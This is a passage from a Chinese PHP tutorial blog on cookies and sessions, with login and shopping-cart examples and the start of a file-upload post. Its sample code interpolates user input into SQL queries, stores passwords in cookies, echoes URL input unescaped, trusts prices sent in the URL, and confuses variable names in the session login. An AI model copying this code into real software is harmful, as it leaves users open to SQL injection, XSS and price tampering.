<td align="left">可选。如果true，那么js就无法读取改cookie，增加安全性。</td>
</tr>
</tbody></table>
<blockquote>
<p>1.一般来说，我们其实用不到上面那么多参数，对于这个函数，我们一般这么用：<font color="#FF7F00"><strong>setcookie(cookie名,cookie值,cookie有效期)</strong></font>;<br>2.没错，就那么3个。如此一来，我们就可以在服务端通过$_COOKIE[‘name’] 来读取cookie了。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;<br><strong>以下是示例：</strong></p>
<ol>
<li>我们将文件名命名为：cookie.php。</li>
<li>我们来模拟我们在互联网上见到最常见的例子：输入用户名和密码，登陆成功的过程。</li>
<li>我们来建一个数据库login,其中有表user,有username和password这两个字段。</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//第一次登陆的时候，通过用户输入的信息来确认用户</span></span><br><span class="line"><span class="keyword">if</span> ( ( <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="literal">null</span> ) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="literal">null</span> ) ) &#123;</span><br><span class="line">    <span class="variable">$userName</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="comment">//从db获取用户信息</span></span><br><span class="line">    <span class="comment">//PS：数据库连接信息改成自己的 分别为主机 数据库用户名 密码</span></span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    mysqli_select_db(<span class="variable">$conn</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from user where `username` = &#x27;<span class="subst">$userName</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_assoc(<span class="variable">$res</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="comment">//密码验证通过，设置cookies，把用户名和密码保存在客户端</span></span><br><span class="line">        setcookie(<span class="string">&#x27;username&#x27;</span>,<span class="variable">$userName</span>,time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>);<span class="comment">//设置时效一个月,一个月后这个cookie失效</span></span><br><span class="line">        setcookie(<span class="string">&#x27;password&#x27;</span>,<span class="variable">$password</span>,time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>);</span><br><span class="line">        <span class="comment">//最后跳转到登录后的欢迎页面</span></span><br><span class="line">        header(<span class="string">&#x27;Location: welcome.php&#x27;</span> . <span class="string">&quot;?username=<span class="subst">$userName</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//再次访问的时候通过cookie来识别用户</span></span><br><span class="line"><span class="keyword">if</span> ( (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="literal">null</span>)  &amp;&amp; (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="literal">null</span>) ) &#123;</span><br><span class="line">    <span class="variable">$userName</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从db获取用户信息</span></span><br><span class="line">    <span class="comment">//PS：数据库连接信息改成自己的 分别为主机 数据库用户名 密码</span></span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$res</span> = mysqli_query(<span class="variable">$conn</span>,<span class="string">&quot;select * from user where `username` =  &#x27;<span class="subst">$userName</span>&#x27; &quot;</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_assoc(<span class="variable">$res</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="comment">//验证通过后跳转到登录后的欢迎页面</span></span><br><span class="line">        header(<span class="string">&#x27;Location: welcome.php&#x27;</span> . <span class="string">&quot;?username=<span class="subst">$userName</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> /&gt;</span><br><span class="line">        密  码：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;password&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span>&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>跳转到的welcome.php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   welcome,<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$user</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<blockquote>
<ol>
<li>这样，当我第一次访问cookie.php的时候，我需要输入用户名和密码，输入完毕后跳转到了welcome.php。然后我关闭浏览器，再次打开cookie.php，这次没有要求我输入用户信息，而是直接跳转到了welcome.php,因为之前我们存的cookie信息被浏览器自动发送到了服务端,服务端做完处理直接跳转到了welcome.php,服务器认识我们了！知道我是之前那个登陆过的用户，这样我们就通过cookie技术让无状态的HTTP协议保持了状态。<br>照着这个做一遍，我相信你会用cookie了。</li>
<li>只不过！！！只不过！！！只不过！！！重要的事要说3遍，<font color="#FF7F00"><strong>我们一般是不会把用户名和密码放到cookie中的，因为这并不安全，容易泄露自己的信息，请不要把重要的信息放到cookie中</strong></font>。我们这个只是一个学习cookie的例子。</li>
</ol>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="四-PHP中使用session"><a href="#四-PHP中使用session" class="headerlink" title="四. PHP中使用session"></a><font color="#FF6347" face="Comic sans MS">四. PHP中使用session</font></h3><p>什么是session以及一些使用方法?可参考博文：<br><font color="#00B2EE">[<a href="http://www.cnblogs.com/lxwphp/p/9237312.html">php中Session使用方法详解</a>]</font><br><font color="#00B2EE">[<a href="https://www.cnblogs.com/mike1314/p/6985457.html">PHP会话机制—session的基本使用</a>]</font><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_sessions.asp">W3school PHP Sessions</a>]</font></p>
<p>&amp;emsp;</p>
<ol>
<li>注意：session_start()函数之前不能有任何输出,session_start() 函数必须位于 <code>&lt;html&gt;</code> 标签之前：<br><code>&lt;?php session_start(); ?&gt;</code><br><code>&lt;\html&gt;</code><br><code>&lt;body&gt;</code><br><code>&lt;/body&gt;</code><br><code>&lt;/html&gt;</code></li>
<li>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。 Session以数组的形式使用，如：$_SESSION[‘session名’]</li>
<li><strong>注册一个会话变量和读取Session</strong></li>
<li><font color="#FF7F00"><strong>在PHP中使用Session变量，除了要启动之外，还要经过注册的过程</strong></font>。注册和读取Session变量，都要通过访问$_SESSION数组完成。在$_SESSION<font color="#FF7F00"><strong>关联数组</strong></font>中的键名具有和PHP中普通变量相同的命名规则。</li>
</ol>
<p>&amp;emsp;</p>
<h4 id="4-1-开启session"><a href="#4-1-开启session" class="headerlink" title="4.1 开启session"></a><font color="#3CB371" face="Comic sans MS">4.1 开启session</font></h4><p><strong>使用函数：</strong><font color="#00B2EE"><strong>bool session_start()</strong></font><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_http_setcookie.asp">PHP setcookie(void) 函数</a>]</font></p>
<p>首先我们要开启session，那么第一个要学习的函数就是<br>bool session_start()了，这个函数没有参数。在php文件的开始使用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session_start();</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h4 id="4-2-注册-添加session数据"><a href="#4-2-注册-添加session数据" class="headerlink" title="4.2 (注册)添加session数据"></a><font color="#3CB371" face="Comic sans MS">4.2 (注册)添加session数据</font></h4><p>开启会话之后，那么在接下来的处理中，我们就可以使用$_SESSION变量来存取信息了。我们要知道的是$_SESSION变量是个数组。当我们要把信息存入session的时候应该这么写：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;userName&#x27;</span>] = <span class="string">&#x27;wang&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h4 id="4-3-读取session数据"><a href="#4-3-读取session数据" class="headerlink" title="4.3 读取session数据"></a><font color="#3CB371" face="Comic sans MS">4.3 读取session数据</font></h4><p>读取很简单，就像我们使用数组一样，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$userName</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;userName&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>当然也可以 $_SESSION[‘userName’] 来用。和<font color="red"><strong>数组一样的使用</strong></font>。</p>
<p>&amp;emsp;</p>
<h4 id="4-4-销毁session数据"><a href="#4-4-销毁session数据" class="headerlink" title="4.4 销毁session数据"></a><font color="#3CB371" face="Comic sans MS">4.4 销毁session数据</font></h4><p>我们可以使用很多种方式来销毁session数据。<br><font color="#00B2EE"><strong>a) unset函数</strong></font><br>我们通过使用类似<br><font color="#00B2EE"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;XXX&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>来销毁session中的 XXX 变量。</p>
<blockquote>
<p><font color="#FF7F00"><strong>请不要！请不要！请不要unset($_SESSION),会导致后续无法使用$_SESSION这个变量！！！</strong></font></p>
</blockquote>
<p>&amp;emsp;<br><font color="#00B2EE"><strong>b) 空数组赋值给session变量</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$\_SESSION = <span class="keyword">array</span>();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>之前我们说过$_SESSOIN变量是个数组，那么空数组赋值的话也是相当于将当前会话的$_SESSION变量中的值销毁。</p>
</blockquote>
<p>&amp;emsp;<br><font color="#00B2EE"><strong>c) session_destory() 函数</strong></font><br><strong>这个函数会销毁当前会话中的全部数据，并结束当前会话。但是不会重置当前会话所关联的全局变量， 也不会重置会话 cookie。</strong></p>
<p><font color="#00B2EE"></font></p>
<p>&amp;emsp;</p>
<h4 id="4-5-session的扩展"><a href="#4-5-session的扩展" class="headerlink" title="4.5 session的扩展"></a><font color="#3CB371" face="Comic sans MS">4.5 session的扩展</font></h4><p>我们可以使用很多种方式来销毁session数据。<br>默认session存储在哪里?<br>&amp;emsp;<br>1.在<code>php.ini</code>配置文件中有这么一行 <code>session.save_handler = files</code>,<br>files说明了php默认的是用文件读写的方式来保存session的。那么在哪个目录呢？继续看。session.save_path &#x3D; “&#x2F;tmp”,这一行前面有个 ; ，说明是被注释的，不过即便这样，php默认的session 也是保存在这里的，<code>/tmp</code>目录。</p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="五-SESSION应用实例"><a href="#五-SESSION应用实例" class="headerlink" title="五. SESSION应用实例"></a><font color="#FF6347" face="Comic sans MS">五. SESSION应用实例</font></h3><h4 id="5-1-登陆例子"><a href="#5-1-登陆例子" class="headerlink" title="5.1 登陆例子"></a><font color="#3CB371" face="Comic sans MS">5.1 登陆例子</font></h4><blockquote>
<p><strong>2个文件：</strong></p>
</blockquote>
<ol>
<li><font color="#FF7F00">login.php</font>，用于登陆界面；</li>
<li><font color="#FF7F00">welcome.php</font>，用于接收从login.php的跳转并设置session。</li>
</ol>
<p><strong>首先建立数据库信息：</strong><br>新建一个名为 login 的数据库，再建一个 user 表，表的结构有2个字段:<br>username  varchar(20)<br>password  varchar(20)</p>
<p>&amp;emsp;<br>login.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> ( ( <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="literal">null</span> ) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="literal">null</span> ) ) &#123;</span><br><span class="line">   <span class="variable">$userName</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">   <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">//从db获取用户信息   数据库信息改成自己的</span></span><br><span class="line">   <span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;host&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">   <span class="variable">$res</span> = mysqli_query(<span class="variable">$conn</span>,<span class="string">&quot;select * from user where `username` =  &#x27;<span class="subst">$username</span>&#x27; &quot;</span>);</span><br><span class="line">   <span class="variable">$row</span> = mysqli_fetch_assoc(<span class="variable">$res</span>);</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>) &#123;</span><br><span class="line">       <span class="comment">//密码验证通过，设置session，把用户名和密码保存在服务端</span></span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//最后跳转到登录后的欢迎页面 //注意：这里我们没有像cookie一样带参数过去</span></span><br><span class="line">       header(<span class="string">&#x27;Location: welcome.php&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;!-- 这里指明页面编码 --&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">       &lt;div&gt;</span><br><span class="line">           用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> /&gt;</span><br><span class="line">           密  码：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;password&quot;</span> /&gt;</span><br><span class="line">           &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span>&gt;        </span><br><span class="line">       &lt;/div&gt;</span><br><span class="line">   &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;<br>welcome.php 这里我们用的是session中的信息,而不是像cookie一样在url中带参数过来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   welcome,<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$username</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;</p>
<h4 id="5-2-购物车例子"><a href="#5-2-购物车例子" class="headerlink" title="5.2 购物车例子"></a><font color="#3CB371" face="Comic sans MS">5.2 购物车例子</font></h4><blockquote>
<p><strong>3个文件：</strong></p>
</blockquote>
<ol>
<li><font color="#FF7F00">goodsList.php</font> 这个是商品展示页，还有功能：如果是第一次购买某物品，则在购物车中加入该商品信息和计算总价，如果再次点击购买，则已购商品数量加1，总价重新计算，查看购物车链接可以到购物车页面。</li>
<li><font color="#FF7F00">buy.php</font> 此页完成购买功能，然后再次跳转到商品列表。主要是做了在session中处理购买商品操作。</li>
<li><font color="#FF7F00">shoppingCart.php</font> 此页展示购物车中的商品、价格、总价等信息。</li>
</ol>
<p>&amp;emsp;<br><strong>首先建立数据库信息：</strong><br>建立名为test的数据库，库中有个shop表，表结构有3个字段：<br>id  int(10)<br>name  varchar(20)<br>price  varchar(20)</p>
<p>&amp;emsp;<br>goodsList.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$goods</span> = <span class="keyword">array</span>();</span><br><span class="line">   <span class="comment">//从数据库获取商品信息存入$goods二维数组</span></span><br><span class="line">   <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">   <span class="comment">//这里请换上自己的数据库相关信息</span></span><br><span class="line">   <span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;host&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">   <span class="variable">$res</span> = mysqli_query(<span class="variable">$conn</span>,<span class="string">&#x27;select * from shop&#x27;</span>);</span><br><span class="line">   <span class="comment">//这里把商品信息放到$goods二维数组，每一维存的是单个</span></span><br><span class="line">   <span class="comment">//商品的信息，比如商品名、价格。</span></span><br><span class="line">   <span class="keyword">while</span> (<span class="variable">$row</span> = mysqli_fetch_assoc(<span class="variable">$res</span>)) &#123;</span><br><span class="line">       <span class="variable">$goods</span>[<span class="variable">$i</span>][<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">       <span class="variable">$goods</span>[<span class="variable">$i</span>][<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">       <span class="variable">$goods</span>[<span class="variable">$i</span>][<span class="string">&#x27;price&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line">       <span class="variable">$i</span>++ ;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   <span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//取出商品信息显示在页面上，并添加购买功能</span></span><br><span class="line">       <span class="keyword">foreach</span> (<span class="variable">$goods</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27; 商品名 &#x27;</span> . <span class="variable">$value</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27; 价格 &#x27;</span> . <span class="variable">$value</span>[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=buy.php?name=&quot;</span> . <span class="variable">$value</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27;&amp;price=&#x27;</span> . <span class="variable">$value</span>[<span class="string">&#x27;price&#x27;</span>] .<span class="string">&quot;&gt;购买&lt;/a&gt;&quot;</span>;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">?&gt;</span></span><br><span class="line">   &lt;a href=<span class="string">&quot;shoppingCart.php&quot;</span>&gt;查看购物车&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>buy.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//开启session</span></span><br><span class="line">   session_start();</span><br><span class="line"></span><br><span class="line">   <span class="comment">//获取传过来的商品名和价格</span></span><br><span class="line">   <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">   <span class="variable">$price</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">//把session中的商品信息和传过来的(刚买的)商品信息对比</span></span><br><span class="line">   <span class="variable">$goods</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;goods&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$name</span> == <span class="variable">$goods</span>[<span class="variable">$name</span>][<span class="string">&#x27;name&#x27;</span>]) &#123;</span><br><span class="line">       <span class="comment">//买过的话，则总价格增加，相应商品数量增加</span></span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;totalPrice&#x27;</span>] += <span class="variable">$price</span>;</span><br><span class="line">       <span class="variable">$goods</span>[<span class="variable">$name</span>][<span class="string">&#x27;number&#x27;</span>] += <span class="number">1</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="comment">//第一次买的话，将相应的商品信息添加到session中</span></span><br><span class="line">       <span class="variable">$goods</span>[<span class="variable">$name</span>][<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$name</span>;</span><br><span class="line">       <span class="variable">$goods</span>[<span class="variable">$name</span>][<span class="string">&#x27;price&#x27;</span>] = <span class="variable">$price</span>;</span><br><span class="line">       <span class="variable">$goods</span>[<span class="variable">$name</span>][<span class="string">&#x27;number&#x27;</span>] += <span class="number">1</span>;</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;totalPrice&#x27;</span>] += <span class="variable">$price</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$_SESSION</span>[<span class="string">&#x27;goods&#x27;</span>] = <span class="variable">$goods</span>;</span><br><span class="line">   <span class="comment">//购买处理完毕后跳转到商品列表</span></span><br><span class="line">   header(<span class="string">&#x27;location: goodsList.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>shoppingCart.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//将session中的商品信息(即购物车中的商品)和总价显示到页面</span></span><br><span class="line"><span class="variable">$goods</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;goods&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;您买了:&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$goods</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$value</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27; 价格 &#x27;</span> . <span class="variable">$value</span>[<span class="string">&#x27;price&#x27;</span>] . <span class="string">&#x27; 数量 &#x27;</span> . <span class="variable">$value</span>[<span class="string">&#x27;number&#x27;</span>] . <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;总价：&#x27;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;totalPrice&#x27;</span>] . <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;a href=<span class="string">&quot;goodsList.php&quot;</span>&gt;返回商品列表&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>效果图如下：</p>
<p><img data-src="https://i.loli.net/2019/02/26/5c7522ea3d61f.png" alt="1"></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-文件上传</title>
    <url>/post/PHP-Upload/</url>
    <content><![CDATA[<p>(。・∀・)ノ</p>
<span id="more"></span>

<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP 文件上传</font></center>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一-修改php-ini文件"><a href="#一-修改php-ini文件" class="headerlink" title="一. 修改php.ini文件"></a><font color="#FF6347" face="Comic sans MS">一. 修改php.ini文件</font></h3><p>一般情况需要修改：[可以使用ctrl+f 搜索相关配置项。]</p>
<table>
<thead>
<tr>
<th align="center">配置项</th>
<th align="left">功能说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file_uploads</td>
<td align="left">on为开启文件上传功能，off为关闭</td>
</tr>
<tr>
<td align="center">post_max_size</td>
<td align="left">系统允许的POST传参的最大值</td>
</tr>
<tr>
<td align="center">upload_max_filesize</td>
<td align="left">系统允许的上传文件的最大值</td>
</tr>
<tr>
<td align="center">memory_limit</td>
<td align="left">内存使用限制</td>
</tr>
<tr>
<td align="center">max_execution_time</td>
<td align="left">(1)脚本执行时间,参数的单位为秒。<br>(2)这个参数是设定脚本的最大执行时间。<br>(3)也可以根据需求做适当的改变。通常不需要来修改，系统默认值即可。超大文件<br>上传的时候，可能会涉及到这一项参数的修改。<br>(4)上传时间太长了，会超时。如果你将此项参数设为0，则是不限制超时时间，不建<br>议使用。</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>建议尺寸：</strong></font> file_size(文件大小) &lt; upload_max_filesize &lt; post_max_size &lt; memory_limit</p>
</blockquote>
<p> &amp;emsp;<br>&amp;emsp;</p>
